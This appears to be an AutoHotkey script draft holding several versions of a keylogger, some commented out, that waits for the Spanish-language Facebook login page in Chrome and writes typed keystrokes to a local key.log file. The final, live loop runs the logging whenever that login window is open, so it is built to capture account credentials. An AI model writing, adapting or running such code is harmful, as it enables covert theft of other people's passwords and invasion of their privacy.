
;SetTitleMatchMode, 3
/*
#IfWinExist, Facebook - Inicia sesión o regístrate - Google Chrome ahk_class Chrome_WidgetWin_1 ahk_exe chrome.exe
#a::
	msgbox, running...
	Loop 
	{  ;  Smallest keylogger I can come up with. Key strokes are saved to key.log, opens in notepad.
		Input, key, V T5,
		FileAppend, %key%, key.log
	}
	return
#IfWinNotExist, Facebook - Inicia sesión o regístrate - Google Chrome ahk_class Chrome_WidgetWin_1 ahk_exe chrome.exe
#a::msgbox, waiting...
*/


	
	
/*
#a::
	IfWinExist, Facebook - Inicia sesión o regístrate - Google Chrome ahk_class Chrome_WidgetWin_1 ahk_exe chrome.exe
	{
		msgbox, running...
		Loop 
		{  ;  Smallest keylogger I can come up with. Key strokes are saved to key.log, opens in notepad.
			Input, key, V T5,
			FileAppend, %key%, key.log
		}
	}
	else
	{
		msgbox, exiting...
		ExitApp
	}
	return	




Loop 
	{  ;  Smallest keylogger I can come up with. Key strokes are saved to key.log, opens in notepad.
		Input, key, V T5,
		FileAppend, %key%, key.log
	}
*/	


Loop
{
	IfWinExist, Facebook - Inicia sesión o regístrate - Google Chrome ahk_class Chrome_WidgetWin_1 ahk_exe chrome.exe
	{
		msgbox, running...
		Loop 5
		{  
			Input, key, V T5,
			FileAppend, %key%, key.log
		}
	}
	else
	{
		msgbox, exiting...
		sleep, 1000	
	}
	sleep, 1000	
}
















